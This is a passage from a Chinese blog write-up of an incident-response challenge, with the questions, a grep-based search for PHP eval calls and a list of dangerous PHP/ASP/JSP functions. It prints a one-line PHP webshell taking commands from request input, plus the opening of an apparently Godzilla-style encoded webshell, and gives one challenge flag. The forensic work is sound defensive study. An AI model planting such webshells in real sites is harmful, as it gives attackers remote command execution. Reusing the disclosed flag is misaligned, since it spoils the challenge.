pan><a class="hover:text-red-700 dark:hover:text-red-400 transition-colors" title="订阅 JSON Feed" href="/feed.json">JSON</a></div><p class="text-sm text-gray-500 dark:text-gray-400">Copyright © <!-- -->2025<!-- --> Sunset.</p></div></footer></div></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"postData":{"id":"玄机第一章 应急响应-webshell查杀","contentHtml":"\u003ch1\u003e第一章 应急响应-webshell查杀\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://xj.edisec.net/challenges/25\"\u003ehttps://xj.edisec.net/challenges/25\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e1.黑客\u003ccode\u003ewebshell\u003c/code\u003e里面的flag flag{xxxxx-xxxx-xxxx-xxxx-xxxx}\u003c/p\u003e\n\u003cp\u003e2.黑客使用的什么工具的\u003ccode\u003eshell github\u003c/code\u003e地址的md5 flag{md5}\u003c/p\u003e\n\u003cp\u003e3.黑客隐藏shell的完整路径的md5 flag{md5} 注 : /xxx/xxx/xxx/xxx/xxx.xxx\u003c/p\u003e\n\u003cp\u003e4.黑客免杀马完整路径 md5 flag{md5}\u003c/p\u003e\n\u003ch2\u003eWebshell\u003c/h2\u003e\n\u003cp\u003e使用\u003ccode\u003efind\u003c/code\u003e命令查找\u003ccode\u003e.php\u003c/code\u003e后缀文件，并且内容带有\u003ccode\u003eeval\u003c/code\u003e函数的文件\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003ePHP: \u003ccode\u003eeval(), system(), exec(), shell_exec(), passthru(), assert(), base64_decode()\u003c/code\u003e\nASP: \u003ccode\u003eExecute(), Eval(), CreateObject()\u003c/code\u003e\nJSP: \u003ccode\u003eRuntime.getRuntime().exec()\u003c/code\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eroot@ip-10-0-10-4:/var/www/html/admin/template# find /var/www -name *.php* | xargs grep -r \u003cspan class=\"hljs-string\"\u003e'eval('\u003c/span\u003e\n/var/www/html/include/gz.php:           \u003cspan class=\"hljs-built_in\"\u003eeval\u003c/span\u003e(\u003cspan class=\"hljs-variable\"\u003e$payload\u003c/span\u003e);\n/var/www/html/include/Db/.Mysqli.php:           \u003cspan class=\"hljs-built_in\"\u003eeval\u003c/span\u003e(\u003cspan class=\"hljs-variable\"\u003e$payload\u003c/span\u003e);\n/var/www/html/shell.php:\u0026#x3C;?php phpinfo();@\u003cspan class=\"hljs-built_in\"\u003eeval\u003c/span\u003e(\u003cspan class=\"hljs-variable\"\u003e$_REQUEST\u003c/span\u003e[1]);?\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e第三个毫无疑问是\u003ccode\u003ewebshell\u003c/code\u003e ，不过没有\u003ccode\u003eflag\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eroot@ip-10-0-10-4:/var/www/html# \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e shell.php\n\u0026#x3C;?php phpinfo();@\u003cspan class=\"hljs-built_in\"\u003eeval\u003c/span\u003e(\u003cspan class=\"hljs-variable\"\u003e$_REQUEST\u003c/span\u003e[1]);?\u003eroot@ip-10-0-10-4:/var/www/html#\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e再看\u003ccode\u003egz.php\u003c/code\u003e 存在\u003ccode\u003eflag\u003c/code\u003e \u003ccode\u003eflag{027ccd04-5065-48b6-a32d-77c704a5e26d}\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eroot@ip-10-0-10-4:/var/www/html# \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e include/gz.php\n\u0026#x3C;?php\n@session_start();\n@set_time_limit(0);\n@error_reporting(0);\n\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e encode(\u003cspan class=\"hljs-variable\"\u003e$D\u003c/span\u003e,\u003cspan class=\"hljs-variable\"\u003e$K\u003c/span\u003e){\n    \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e(\u003cspan class=\"hljs-variable\"\u003e$i\u003c/span\u003e=0;\u003cspan class=\"hljs-variable\"\u003e$i\u003c/span\u003e\u0026#x3C;strlen(\u003cspan class=\"hljs-variable\"\u003e$D\u003c/span\u003e);\u003cspan class=\"hljs-variable\"\u003e$i\u003c/span\u003e++) {\n        \u003cspan class=\"hljs-variable\"\u003e$c\u003c/span\u003e = \u003cspan class=\"hljs-variable\"\u003e$K\u003c/span\u003e[\u003cspan class=\"hljs-variable\"\u003e$i\u003c/span\u003e+1\u0026#x26;15]
